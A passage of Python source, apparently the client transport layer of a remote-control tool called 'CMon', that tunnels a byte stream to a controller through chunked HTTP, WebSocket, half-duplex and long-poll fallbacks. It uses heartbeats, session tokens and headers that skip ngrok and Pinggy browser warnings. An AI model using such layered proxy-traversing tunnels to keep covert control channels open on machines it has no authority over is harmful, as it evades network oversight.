        return self._in.fileno()

    def __getattr__(self, name):
        return getattr(self._in, name)

    def send(self, data):
        if not data:
            return 0
        with self._send_lock:
            if self._closed or self._write_closed:
                raise OSError('HTTP tunnel is closed')
            try:
                # One write per chunk: fewer syscalls and no half-written
                # chunk header for a slow proxy to parse.
                header = ('{:x}\r\n'.format(len(data))).encode('ascii')
                self._raw_send(b''.join((header, data, b'\r\n')))
            except OSError:
                self._broken()
                raise
        return len(data)

    def sendall(self, data):
        self.send(data)

    def _end_write(self):
        with self._send_lock:
            if self._closed or self._write_closed:
                return
            self._write_closed = True
            try:
                self._raw_send(b'0\r\n\r\n')
            except OSError:
                self._broken()

    def shutdown(self, how):
        if how in (socket.SHUT_WR, socket.SHUT_RDWR):
            self._end_write()
        if how in (socket.SHUT_RD, socket.SHUT_RDWR):
            try:
                self._in.shutdown(socket.SHUT_RD)
            except OSError:
                pass

    def close(self):
        # _broken() marks the stream closed early, but the descriptors still
        # have to be released: a send failure used to leak the raw socket and
        # both socketpair ends on every reconnect.
        self._closed = True
        if self._resources_closed:
            return
        self._resources_closed = True
        try:
            self.raw.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.raw.close()
        except OSError:
            pass
        for sock in (self._in, self._out):
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass

    def _broken(self):
        self._closed = True
        try:
            self.raw.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass

    def _raw_send(self, data):
        view = memoryview(data)
        last_progress = time.time()
        while view:
            try:
                sent = self.raw.send(view)
            except (socket.timeout, TimeoutError):
                # SO_SNDTIMEO bounds one kernel wait.  Treat several waits as
                # one slow transfer instead of dropping a mobile link that is
                # still draining, but still fail when there is no progress.
                if time.time() - last_progress > HTTP_SEND_STALL_TIMEOUT:
                    raise OSError('HTTP tunnel send stalled')
                time.sleep(0.02)
                continue
            if sent <= 0:
                raise OSError('HTTP tunnel closed while sending')
            view = view[sent:]
            last_progress = time.time()

    def _send_heartbeat(self):
        with self._send_lock:
            if self._closed or self._write_closed:
                return
            try:
                self._raw_send(b'1;cmon-ping\r\n \r\n')
            except OSError:
                self._broken()

    def _read_more(self):
        """Read one wire block, sending heartbeats while the link is idle."""
        while True:
            now = time.monotonic()
            if now >= self._next_ping:
                self._next_ping = now + CMON_HTTP_PING
                self._send_heartbeat()
            if now - self._last_rx > CMON_HTTP_DEAD:
                raise OSError('HTTP tunnel peer stopped answering')
            try:
                chunk = self.raw.recv(RECV_CHUNK)
            except (socket.timeout, TimeoutError):
                continue
            if not chunk:
                raise ConnectionError('HTTP tunnel closed')
            self._last_rx = time.monotonic()
            self._buf += chunk
            return

    def _raw_read(self, n):
        while len(self._buf) < n:
            self._read_more()
        data = bytes(self._buf[:n])
        del self._buf[:n]
        return data

    def _read_line(self):
        while b'\r\n' not in self._buf:
            if len(self._buf) > HTTP_MAX_LINE:
                raise OSError('HTTP chunk line is too large')
            self._read_more()
        line, _sep, rest = self._buf.partition(b'\r\n')
        if len(line) > HTTP_MAX_LINE:
            raise OSError('HTTP chunk line is too large')
        self._buf = bytearray(rest)
        return bytes(line)

    def _write_local(self, data):
        """Feed decoded body bytes to the application side of the pair.

        The timeout turns a permanently full socketpair into a wake-up once a
        second, so HttpTunnel.close() can stop the pump even when the rest of
        the client is no longer reading.  Data is still delivered in order and
        without an artificial delay."""
        view = memoryview(data)
        while view:
            try:
                sent = self._out.send(view)
            except (socket.timeout, TimeoutError):
                if self._closed:
                    raise ConnectionError('HTTP tunnel closed')
                continue
            if sent <= 0:
                raise ConnectionError('HTTP tunnel closed')
            view = view[sent:]

    def _pump(self):
        try:
            while not self._closed:
                line = self._read_line()
                if not line:
                    continue
                size_text, _sep, extensions = line.partition(b';')
                try:
                    size = int(size_text.strip(), 16)
                except ValueError:
                    raise OSError('invalid HTTP chunk size')
                if size < 0 or size > HTTP_MAX_CHUNK:
                    raise OSError('HTTP chunk is too large')
                if size == 0:
                    trailer_bytes = 0
                    trailer_count = 0
                    while True:
                        trailer = self._read_line()
                        trailer_bytes += len(trailer) + 2
                        if trailer_bytes > HTTP_MAX_HEADER:
                            raise OSError('HTTP trailers are too large')
                        if not trailer:
                            break
                        trailer_count += 1
                        if trailer_count > 128:
                            raise OSError('too many HTTP trailers')
                    break
                heartbeat = b'cmon-ping' in extensions.lower()
                remaining = size
                while remaining:
                    piece = self._raw_read(min(remaining, RECV_CHUNK))
                    if not piece:
                        raise ConnectionError('HTTP chunk ended early')
                    if not heartbeat:
                        self._write_local(piece)
                    remaining -= len(piece)
                if self._raw_read(2) != b'\r\n':
                    raise OSError('missing HTTP chunk terminator')
        except (OSError, ValueError, ConnectionError):
            pass
        finally:
            try:
                self._out.shutdown(socket.SHUT_WR)
            except OSError:
                pass


class TransportNotSupported(OSError):
    """This transport is not available at the address; try the next one."""


def _kernel_send_timeout(sock):
    """Set SO_SNDTIMEO only (never the Python-wide socket timeout).

    A blocking send on a dead proxy must not park a worker forever, while an
    idle recv is perfectly normal.  Setting SO_SNDTIMEO leaves recv alone; the
    adapters already catch socket.timeout and treat it as temporary no-progress.
    """
    try:
        if os.name == 'nt':
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
                            SEND_TIMEOUT * 1000)
        else:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
                            struct.pack('ll', SEND_TIMEOUT, 0))
    except OSError:
        pass


class WebSocketTunnel(object):
    """Socket-shaped duplex adapter over RFC 6455 binary frames (client side).

    The implementation deliberately matches controller.py: binary frames carry
    the unchanged stream, client frames are masked, server frames may be
    unmasked, and ping/pong keeps middle boxes and mobile NATs alive.  It is
    standard-library only, so it works on Python 3.9+ on every target OS.
    """

    def __init__(self, raw, server_side=False, initial=b'', name='websocket'):
        self.raw = raw
        self.server_side = server_side
        self.name = name
        _kernel_send_timeout(raw)
        self._in, self._out = socket.socketpair()
        self._in.settimeout(None)
        self._out.settimeout(1.0)
        try:
            for sock in (self._in, self._out):
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUFFER)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCKET_BUFFER)
        except OSError:
            pass
        self._buf = bytearray(initial)
        self._send_lock = threading.Lock()
        self._closed = False
        self._resources_closed = False
        self._write_closed = False
        self._last_rx = time.monotonic()
        self._next_ping = self._last_rx + CMON_WS_PING
        try:
            self.raw.settimeout(1.0)
        except (AttributeError, OSError):
            pass
        self._reader = threading.Thread(target=self._pump,
                                        name=name + '-reader', daemon=True)
        self._reader.start()

    def fileno(self):
        return self._in.fileno()

    def __getattr__(self, name):
        return getattr(self._in, name)

    def send(self, data):
        if not data:
            return 0
        with self._send_lock:
            if self._closed or self._write_closed:
                raise OSError('WebSocket tunnel is closed')
            try:
                view = memoryview(data)
                while view:
                    piece = view[:CMON_WS_MAX_FRAME]
                    self._raw_send(self._frame(piece, 0x2))
                    view = view[len(piece):]
            except OSError:
                self._broken()
                raise
        return len(data)

    def sendall(self, data):
        self.send(data)

    def _frame(self, payload, opcode):
        payload = bytes(payload)
        length = len(payload)
        if length > MAX_MSG:
            raise OSError('WebSocket frame is too large')
        first = 0x80 | (opcode & 0x0f)
        mask_bit = 0x00 if self.server_side else 0x80
        if length < 126:
            header = struct.pack('!BB', first, mask_bit | length)
        elif length < 65536:
            header = struct.pack('!BBH', first, mask_bit | 126, length)
        else:
            header = struct.pack('!BBQ', first, mask_bit | 127, length)
        if self.server_side:
            return header + payload
        mask = os.urandom(4)
        return header + mask + _ws_apply_mask(payload, mask)

    def _end_write(self):
        with self._send_lock:
            if self._closed or self._write_closed:
                return
            self._write_closed = True
            try:
                self._raw_send(self._frame(b'', 0x8))
            except OSError:
                self._broken()

    def shutdown(self, how):
        if how in (socket.SHUT_WR, socket.SHUT_RDWR):
            self._end_write()
        if how in (socket.SHUT_RD, socket.SHUT_RDWR):
            try:
                self._in.shutdown(socket.SHUT_RD)
            except OSError:
                pass

    def close(self):
        self._closed = True
        self._end_write()
        if self._resources_closed:
            return
        self._resources_closed = True
        try:
            self.raw.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.raw.close()
        except OSError:
            pass
        for sock in (self._in, self._out):
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass

    def _broken(self):
        self._closed = True
        try:
            self.raw.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass

    def _raw_send(self, data):
        view = memoryview(data)
        last_progress = time.time()
        while view:
            try:
                sent = self.raw.send(view)
            except (socket.timeout, TimeoutError):
                if time.time() - last_progress > HTTP_SEND_STALL_TIMEOUT:
                    raise OSError('WebSocket send stalled')
                time.sleep(0.02)
                continue
            if sent <= 0:
                raise OSError('WebSocket closed while sending')
            view = view[sent:]
            last_progress = time.time()

    def _send_control(self, opcode, payload=b''):
        with self._send_lock:
            if self._closed:
                return
            try:
                self._raw_send(self._frame(payload, opcode))
            except OSError:
                self._broken()

    def _raw_read(self, n):
        while len(self._buf) < n:
            if self._closed:
                raise ConnectionError('WebSocket tunnel closed')
            now = time.monotonic()
            if now >= self._next_ping:
                self._next_ping = now + CMON_WS_PING
                self._send_control(0x9, b'cmon')
            if now - self._last_rx > CMON_WS_DEAD:
                raise OSError('WebSocket peer stopped answering')
            try:
                chunk = self.raw.recv(RECV_CHUNK)
            except (socket.timeout, TimeoutError):
                continue
            if not chunk:
                raise ConnectionError('WebSocket tunnel closed')
            self._buf += chunk
            self._last_rx = time.monotonic()
        data = bytes(self._buf[:n])
        del self._buf[:n]
        return data

    def _write_local(self, data):
        view = memoryview(data)
        while view:
            try:
                sent = self._out.send(view)
            except (socket.timeout, TimeoutError):
                if self._closed:
                    raise ConnectionError('WebSocket tunnel closed')
                continue
            if sent <= 0:
                raise ConnectionError('WebSocket tunnel closed')
            view = view[sent:]

    def _read_frame(self):
        first, second = struct.unpack('!BB', self._raw_read(2))
        opcode = first & 0x0f
        masked = bool(second & 0x80)
        length = second & 0x7f
        if length == 126:
            length = struct.unpack('!H', self._raw_read(2))[0]
        elif length == 127:
            length = struct.unpack('!Q', self._raw_read(8))[0]
        if length > MAX_MSG:
            raise OSError('WebSocket peer sent an oversized frame')
        mask = self._raw_read(4) if masked else b''
        payload = self._raw_read(length) if length else b''
        if masked:
            payload = _ws_apply_mask(payload, mask)
        self._last_rx = time.monotonic()
        return opcode, payload

    def _pump(self):
        try:
            while not self._closed:
                opcode, payload = self._read_frame()
                if opcode == 0x8:
                    self._send_control(0x8, payload[:125])
                    break
                if opcode == 0x9:
                    self._send_control(0xa, payload[:125])
                    continue
                if opcode == 0xa:
                    continue
                if opcode in (0x0, 0x1, 0x2) and payload:
                    self._write_local(payload)
        except (OSError, ValueError, ConnectionError, struct.error):
            pass
        finally:
            try:
                self._out.shutdown(socket.SHUT_WR)
            except OSError:
                pass


def _ws_apply_mask(data, mask):
    """Byte-wise RFC 6455 XOR using one big-integer operation.

    A Python per-byte loop (and even a per-32-bit-word loop) was the limiting
    factor for downloads.  int.from_bytes/xor/to_bytes runs in C and keeps the
    same bytewise semantics on little- and big-endian hosts.  WebSocket frames
    are already split to CMON_WS_MAX_FRAME by send(), so this stays bounded.
    """
    if not data:
        return b''
    if len(mask) != 4:
        raise OSError('invalid WebSocket mask')
    length = len(data)
    pattern = mask * (length // 4) + mask[:length % 4]
    return (int.from_bytes(data, 'big') ^
            int.from_bytes(pattern, 'big')).to_bytes(length, 'big')

def _ws_accept_value(key):
    return base64.b64encode(hashlib.sha1(
        (key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').encode('ascii')).digest()).decode('ascii')


def _host_header(host, port):
    value = str(host)
    if ':' in value and not value.startswith('['):
        value = '[{}]'.format(value)
    return '{}:{}'.format(value, port)


def _tunnel_headers(host, token=None, role='control'):
    headers = [
        'User-Agent: {}'.format(CMON_USER_AGENT),
        'Accept: */*',
        'Cache-Control: no-store',
        # Both free tunnel services show a one-time browser page only to
        # browser-like clients.  A non-browser User-Agent plus these documented
        # opt-out headers keeps the raw protocol untouched.
        'ngrok-skip-browser-warning: 1',
        'X-Pinggy-No-Screen: 1',
        'X-CMon-Role: {}'.format(role),
    ]
    if token:
        headers.append('X-CMon-Token: {}'.format(token))
    return headers


def _ws_connect(host, port, path='/tunnel', use_tls=True, token=None):
    """Open a WebSocket tunnel to the controller or tunnel edge."""
    sock = _connect_target(host, port)
    try:
        _tune_socket(sock)
        if use_tls:
            sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
            sock = _wrap_client_tls(sock, host)
            try:
                selected = sock.selected_alpn_protocol()
            except (AttributeError, NotImplementedError, OSError):
                selected = None
            if selected not in (None, 'http/1.1'):
                raise TransportNotSupported(
                    'TLS negotiated {!r}; this tunnel uses HTTP/1.1'.format(selected))
        key = base64.b64encode(os.urandom(16)).decode('ascii')
        query = ''
        if token:
            query = '?token=' + quote(token, safe='')
        lines = [
            'GET {}{} HTTP/1.1'.format(path, query),
            'Host: {}'.format(_host_header(host, port)),
            'Upgrade: websocket',
            'Connection: Upgrade',
            'Sec-WebSocket-Key: {}'.format(key),
            'Sec-WebSocket-Version: 13',
            'Sec-WebSocket-Protocol: {}'.format(CMON_WS_PROTOCOL),
        ]
        lines.extend(_tunnel_headers(host, token))
        lines.append('')
        lines.append('')
        sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
        sock.sendall('\r\n'.join(lines).encode('latin-1'))
        head, extra = _read_http_head(sock)
        parts = head.split('\r\n')
        status = parts[0].split(None, 2) if parts else []
        if len(status) < 2:
            raise TransportNotSupported('malformed WebSocket response')
        try:
            code = int(status[1])
        except ValueError:
            raise TransportNotSupported('malformed WebSocket status')
        if code != 101:
            raise TransportNotSupported(
                'WebSocket upgrade returned HTTP {} {}'.format(
                    code, status[2] if len(status) > 2 else ''))
        headers = _http_headers(parts[1:])
        if headers.get('sec-websocket-accept', '') != _ws_accept_value(key):
            raise TransportNotSupported('incorrect Sec-WebSocket-Accept')
        selected = headers.get('sec-websocket-protocol', '')
        if selected and selected != CMON_WS_PROTOCOL:
            raise TransportNotSupported(
                'WebSocket subprotocol {!r} is not supported'.format(selected))
        sock.settimeout(None)
        return WebSocketTunnel(sock, server_side=False, initial=extra,
                               name='ws-' + path.strip('/'))
    except Exception:
        try:
            sock.close()
        except OSError:
            pass
        raise


def _http_connect(host, port, path='/tunnel', use_tls=True, token=None):
    """Open one streaming HTTP/1.1 tunnel (POST request body + chunked reply)."""
    sock = _connect_target(host, port)
    try:
        _tune_socket(sock)
        if use_tls:
            sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
            sock = _wrap_client_tls(sock, host)
            try:
                selected = sock.selected_alpn_protocol()
            except (AttributeError, NotImplementedError, OSError):
                selected = None
            if selected not in (None, 'http/1.1'):
                raise TransportNotSupported(
                    'TLS negotiated {!r}; this tunnel uses HTTP/1.1'.format(selected))
        request = [
            'POST {} HTTP/1.1'.format(path),
            'Host: {}'.format(_host_header(host, port)),
            'Content-Type: application/octet-stream',
            'Transfer-Encoding: chunked',
            'Connection: keep-alive',
        ]
        request.extend(_tunnel_headers(host, token))
        request.extend(['', ''])
        sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
        sock.sendall('\r\n'.join(request).encode('latin-1'))
        head, extra = _read_http_head(sock)
        lines = head.split('\r\n')
        if not lines:
            raise TransportNotSupported('empty HTTP response')
        status = lines[0].split(None, 2)
        if len(status) < 2:
            raise TransportNotSupported('malformed HTTP status line: {!r}'.format(lines[0]))
        try:
            code = int(status[1])
        except ValueError:
            raise TransportNotSupported('malformed HTTP status code')
        if code != 200:
            raise TransportNotSupported('controller returned HTTP {} {}'.format(
                code, status[2] if len(status) > 2 else ''))
        headers = _http_headers(lines[1:])
        transfer_tokens = [item.strip() for item in
                           headers.get('transfer-encoding', '').lower().split(',')
                           if item.strip()]
        if (not transfer_tokens or transfer_tokens[-1] != 'chunked'
                or any(item not in ('identity', 'chunked')
                       for item in transfer_tokens[:-1])):
            raise TransportNotSupported('controller response is not chunked')
        encoding = headers.get('content-encoding', '').strip().lower()
        if encoding not in ('', 'identity'):
            raise TransportNotSupported(
                'controller/proxy compressed the tunnel ({})'.format(encoding))
        sock.settimeout(None)
        return HttpTunnel(sock, extra, name='http-' + path.strip('/'))
    except Exception:
        try:
            sock.close()
        except OSError:
            pass
        raise


class _BodyStream(object):
    """Minimal HTTP response-body reader for chunked or close-delimited bodies."""

    def __init__(self, sock, headers, initial=b''):
        self.sock = sock
        # wire holds undecoded HTTP bytes (chunk sizes/CRLF); body holds only
        # application bytes.  Keeping them separate avoids reordering a chunk
        # when recv() returns the next chunk header in the same packet.
        self.wire = bytearray(initial)
        self.body = bytearray()
        tokens = [item.strip().lower() for item in
                  headers.get('transfer-encoding', '').split(',') if item.strip()]
        self.chunked = bool(tokens and tokens[-1] == 'chunked')
        self.eof = False

    def _recv(self, size=262144, timeout=None):
        if timeout is not None:
            self.sock.settimeout(timeout)
        try:
            return self.sock.recv(size)
        finally:
            if timeout is not None:
                try:
                    self.sock.settimeout(None)
                except OSError:
                    pass

    def _line(self):
        while b'\r\n' not in self.wire:
            if len(self.wire) > HTTP_MAX_LINE:
                raise OSError('HTTP body line is too large')
            chunk = self._recv(timeout=CMON_WS_DEAD)
            if not chunk:
                raise OSError('HTTP body ended early')
            self.wire += chunk
        line, _sep, rest = self.wire.partition(b'\r\n')
        self.wire = bytearray(rest)
        return bytes(line)

    def _need_wire(self, n):
        while len(self.wire) < n:
            chunk = self._recv(timeout=CMON_WS_DEAD)
            if not chunk:
                raise OSError('HTTP body ended early')
            self.wire += chunk

    def _more(self):
        if self.eof:
            return False
        if not self.chunked:
            chunk = self._recv(timeout=CMON_WS_DEAD)
            if not chunk:
                self.eof = True
                return False
            self.body += chunk
            return True
        line = self._line()
        while not line and not self.eof:
            line = self._line()
        try:
            size = int(line.split(b';', 1)[0].strip(), 16)
        except ValueError:
            raise OSError('invalid HTTP chunk size')
        if size < 0 or size > HTTP_MAX_CHUNK:
            raise OSError('HTTP chunk is too large')
        if size == 0:
            while True:
                trailer = self._line()
                if not trailer:
                    break
            self.eof = True
            return False
        self._need_wire(size + 2)
        self.body += self.wire[:size]
        del self.wire[:size]
        if self.wire[:2] != b'\r\n':
            raise OSError('missing HTTP chunk terminator')
        del self.wire[:2]
        return True

    def read(self, n):
        while len(self.body) < n and not self.eof:
            if not self._more():
                break
        data = bytes(self.body[:n])
        del self.body[:n]
        return data

    def read_exact(self, n):
        data = self.read(n)
        if len(data) != n:
            raise OSError('HTTP body ended early')
        return data


class HalfTunnelClient(object):
    """Client-side socket-shaped adapter for the portable two-request fallback."""

    def __init__(self, down_sock, reader, session_id, host, port, use_tls,
                 role='control', token=None):
        self.down_sock = down_sock
        self.reader = reader
        self.session_id = session_id
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.role = role
        self.token = token
        self._in, self._out = socket.socketpair()
        self._in.settimeout(None)
        self._out.settimeout(1.0)
        try:
            for sock in (self._in, self._out):
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUFFER)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCKET_BUFFER)
        except OSError:
            pass
        self.up_q = queue.Queue(maxsize=128)
        self.up_sock = None
        self.up_seq = 0
        self._closed = False
        self._write_closed = False
        self._resources_closed = False
        self._down_thread = threading.Thread(
            target=self._down_loop, name='half-down-client', daemon=True)
        self._up_thread = threading.Thread(
            target=self._up_loop, name='half-up-client', daemon=True)
        self._down_thread.start()
        self._up_thread.start()

    def fileno(self):
        return self._in.fileno()

    def __getattr__(self, name):
        return getattr(self._in, name)

    def send(self, data):
        if not data:
            return 0
        if self._closed or self._write_closed:
            raise OSError('half-duplex tunnel is closed')
        try:
            self.up_q.put(bytes(data), timeout=30)
        except queue.Full:
            raise OSError('half-duplex send queue is full')
        return len(data)

    def sendall(self, data):
        self.send(data)

    def shutdown(self, how):
        if how in (socket.SHUT_WR, socket.SHUT_RDWR):
            if not self._write_closed:
                self._write_closed = True
                try:
                    self.up_q.put_nowait(None)
                except queue.Full:
                    pass
        if how in (socket.SHUT_RD, socket.SHUT_RDWR):
            try:
                self._in.shutdown(socket.SHUT_RD)
            except OSError:
                pass

    def close(self):
        if self._closed:
            return
        self._closed = True
        try:
            self.up_q.put_nowait(None)
        except queue.Full:
            pass
        try:
            self.down_sock.close()
        except OSError:
            pass
        self._close_up_socket()
        if self._resources_closed:
            return
        self._resources_closed = True
        for sock in (self._in, self._out):
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass

    def _write_local(self, data):
        view = memoryview(data)
        while view:
            try:
                sent = self._out.send(view)
            except (socket.timeout, TimeoutError):
                if self._closed:
                    raise ConnectionError('half-duplex tunnel closed')
                continue
            if sent <= 0:
                raise ConnectionError('half-duplex tunnel closed')
            view = view[sent:]

    def _down_loop(self):
        try:
            while not self._closed:
                kind = self.reader.read_exact(1)
                if kind == b'\x00':
                    continue
                if kind == b'\x02':
                    break
                if kind != b'\x01':
                    raise OSError('bad half-duplex frame')
                length = int.from_bytes(self.reader.read_exact(4), 'big')
                if length > MAX_MSG:
                    raise OSError('half-duplex frame is too large')
                self._write_local(self.reader.read_exact(length))
        except (OSError, ValueError, ConnectionError):
            pass
        finally:
            try:
                self._out.shutdown(socket.SHUT_WR)
            except OSError:
                pass
            try:
                self.down_sock.close()
            except OSError:
                pass

    def _close_up_socket(self):
        sock = self.up_sock
        self.up_sock = None
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass

    def _open_up_socket(self):
        sock = _connect_target(self.host, self.port)
        try:
            _tune_socket(sock)
            if self.use_tls:
                sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
                sock = _wrap_client_tls(sock, self.host)
            sock.settimeout(HALF_UP_TIMEOUT)
            return sock
        except Exception:
            try:
                sock.close()
            except OSError:
                pass
            raise

    def _send_up_once(self, data, sequence):
        if self.up_sock is None:
            self.up_sock = self._open_up_socket()
        sock = self.up_sock
        version = 'HTTP/1.0' if (os.environ.get('CMON_FORCE_HTTP10') or '').strip() in ('1', 'true', 'yes') else 'HTTP/1.1'
        lines = [
            'POST /up {}'.format(version),
            'Host: {}'.format(_host_header(self.host, self.port)),
            'Content-Type: application/octet-stream',
            'Content-Length: {}'.format(len(data)),
            'Connection: keep-alive',
            'X-CMon-Session: {}'.format(self.session_id),
            'X-CMon-Up-Seq: {}'.format(sequence),
        ]
        lines.extend(_tunnel_headers(self.host, self.token, self.role))
        lines.extend(['', ''])
        sock.settimeout(HALF_UP_TIMEOUT)
        sock.sendall('\r\n'.join(lines).encode('latin-1') + data)
        head, extra = _read_http_head(sock)
        parts = head.split('\r\n')
        status = parts[0].split(None, 2) if parts else []
        if len(status) < 2:
            raise OSError('POST /up returned no HTTP status')
        code = int(status[1])
        response_version = status[0].upper()
        response_headers = _http_headers(parts[1:])
        try:
            length = int(response_headers.get('content-length', '0') or 0)
        except ValueError:
            length = 0
        # Consume the tiny response body so the next request on this socket
        # starts at the right byte.  A proxy that buffered part of it leaves
        # the rest in `extra`.
        body = bytearray(extra[:length])
        while len(body) < length:
            chunk = sock.recv(min(length - len(body), 65536))
            if not chunk:
                raise OSError('POST /up response body ended early')
            body += chunk
        tokens = [item.strip().lower() for item in
                  response_headers.get('connection', '').split(',')
                  if item.strip()]
        if ('close' in tokens
                or (response_version == 'HTTP/1.0' and 'keep-alive' not in tokens)):
            self._close_up_socket()
        if code != 200:
            raise OSError('POST /up returned {}'.format(' '.join(status[:2])))

    def _send_up(self, data):
        # One failed request is retried once on a fresh connection.  The
        # sequence number makes the retry idempotent even when the first
        # request reached the controller but its response was lost.
        self.up_seq += 1
        sequence = self.up_seq
        try:
            self._send_up_once(data, sequence)
        except OSError:
            self._close_up_socket()
            if self._closed:
                raise
            self._send_up_once(data, sequence)

    def _up_loop(self):
        try:
            while not self._closed:
                try:
                    first = self.up_q.get(timeout=0.5)
                except queue.Empty:
                    continue
                if first is None:
                    break
                batch = bytearray(first)
                # Batch small writes (keystrokes, JSON replies) for a short
                # time, but never hold a large file transfer hostage.
                while len(batch) < HALF_UP_BATCH:
                    try:
                        more = self.up_q.get_nowait()
                    except queue.Empty:
                        if len(batch) < 64 * 1024:
                            time.sleep(0.005)
                            try:
                                more = self.up_q.get_nowait()
                            except queue.Empty:
                                break
                        else:
                            break
                    if more is None:
                        break
                    batch += more
                if batch:
                    self._send_up(bytes(batch))
        except (OSError, ValueError) as e:
            if not self._closed:
                print('[!] half-duplex upload stopped: {}'.format(e))
                try:
                    self.down_sock.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
        finally:
            try:
                self._out.shutdown(socket.SHUT_WR)
            except OSError:
                pass


# ---------------------------------------------------------------------------
# HTTP long-poll fallback (last resort)
#
# Unlike /down, every response here has a finite Content-Length and the
# request closes.  A proxy that buffers whole responses therefore delays a
# batch but cannot hide it forever, and a buffered request body cannot block
# a keystroke.  The controller serves it from the same bytes and offsets as
# every other transport.
# ---------------------------------------------------------------------------

POLL_WAIT = 8.0               # controller holds an empty down request this long
POLL_BATCH = 2 * 1024 * 1024  # one down response / upload request
POLL_TIMEOUT = 25.0           # response timeout (wait + slow proxy)


def _poll_request(host, port, use_tls, method, path, body=b'', timeout=POLL_TIMEOUT):
    """One short HTTP request; returns (status, headers, body)."""
    sock = _connect_target(host, port)
    try:
        _tune_socket(sock)
        if use_tls:
            sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
            sock = _wrap_client_tls(sock, host)
        version = ('HTTP/1.0' if (os.environ.get('CMON_FORCE_HTTP10')
                                  or '').strip() in ('1', 'true', 'yes')
                   else 'HTTP/1.1')
        lines = [
            '{} {} {}'.format(method, path, version),
            'Host: {}'.format(_host_header(host, port)),
            'Accept: */*',
            'Content-Type: application/octet-stream',
            'Content-Length: {}'.format(len(body)),
            'Connection: close',
            'Cache-Control: no-store',
            'User-Agent: {}'.format(CMON_USER_AGENT),
            'ngrok-skip-browser-warning: 1',
            'X-Pinggy-No-Screen: 1',
            'X-CMon: 1',
        ]
        lines.extend(['', ''])
        sock.settimeout(timeout)
        sock.sendall('\r\n'.join(lines).encode('latin-1') + body)
        # The controller holds an empty down request up to POLL_WAIT before
        # sending even the response headers, so the header timeout must cover
        # that wait plus proxy latency (the default 10s was too tight).
        head, extra = _read_http_head(sock, timeout=timeout)
        parts = head.split('\r\n')
        if not parts:
            raise TransportNotSupported('empty poll response')
        status = parts[0].split(None, 2)
        if len(status) < 2:
            raise TransportNotSupported('malformed poll status')
        try:
            code = int(status[1])
        except ValueError:
            raise TransportNotSupported('malformed poll status code')
        headers = _http_headers(parts[1:])
        sock.settimeout(timeout)
        length_text = headers.get('content-length')
        if length_text is not None:
            try:
                length = int(length_text)
            except ValueError:
                raise TransportNotSupported('bad poll Content-Length')
            if length < 0 or length > MAX_MSG:
                raise TransportNotSupported('poll response is too large')
            data = bytearray(extra[:length])
            while len(data) < length:
                chunk = sock.recv(min(length - len(data), 262144))
                if not chunk:
                    raise TransportNotSupported('poll response ended early')
                data += chunk
            return code, headers, bytes(data)
        # A proxy may re-chunk the response even though the controller sent a
        # length.  Read to EOF (Connection: close), bounded to a few batches.
        stream = _BodyStream(sock, headers, extra)
        data = bytearray()
        while len(data) <= POLL_BATCH * 4:
            chunk = stream.read(65536)
            if not chunk:
                break
            data += chunk
        return code, headers, bytes(data)
    finally:
        try:
            sock.close()
        except OSError:
            pass


class PollTunnelClient(object):
    """Client-side socket-shaped adapter for the long-poll fallback."""

    def __init__(self, host, port, use_tls, sid, role='control', token=None,
                 initial=b''):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.session_id = sid
        self.role = role
        self.token = token
        self._in, self._out = socket.socketpair()
        self._in.settimeout(None)
        self._out.settimeout(1.0)
        try:
            for sock in (self._in, self._out):
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUFFER)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCKET_BUFFER)
        except OSError:
            pass
        self.down_pos = 0
        self.up_seq = 0
        self.up_q = queue.Queue(maxsize=128)
        self._closed = False
        self._write_closed = False
        self._resources_closed = False
        self._close_notified = False
        self._initial = bytes(initial)
        self._down_thread = threading.Thread(
            target=self._down_loop, name='poll-down-client', daemon=True)
        self._up_thread = threading.Thread(
            target=self._up_loop, name='poll-up-client', daemon=True)
        self._down_thread.start()
        self._up_thread.start()

    def fileno(self):
        return self._in.fileno()

    def __getattr__(self, name):
        return getattr(self._in, name)

    def send(self, data):
        if not data:
            return 0
        if self._closed or self._write_closed:
            raise OSError('poll tunnel is closed')
        try:
            self.up_q.put(bytes(data), timeout=30)
        except queue.Full:
            raise OSError('poll send queue is full')
        return len(data)

    def sendall(self, data):
        self.send(data)

    def shutdown(self, how):
        if how in (socket.SHUT_WR, socket.SHUT_RDWR):
            if not self._write_closed:
                self._write_closed = True
                try:
                    self.up_q.put_nowait(None)
                except queue.Full:
                    pass
        if how in (socket.SHUT_RD, socket.SHUT_RDWR):
            try:
                self._in.shutdown(socket.SHUT_RD)
            except OSError:
                pass

    def close(self):
        if self._closed and self._resources_closed:
            return
        self._closed = True
        if not self._close_notified:
            self._close_notified = True
            # Tell the controller immediately instead of leaving its reader
            # (and its session slot) waiting for the 45s GC timeout.
            threading.Thread(target=self._notify_close,
                             name='poll-close', daemon=True).start()
        try:
            self.up_q.put_nowait(None)
        except queue.Full:
            pass
        if self._resources_closed:
            return
        self._resources_closed = True
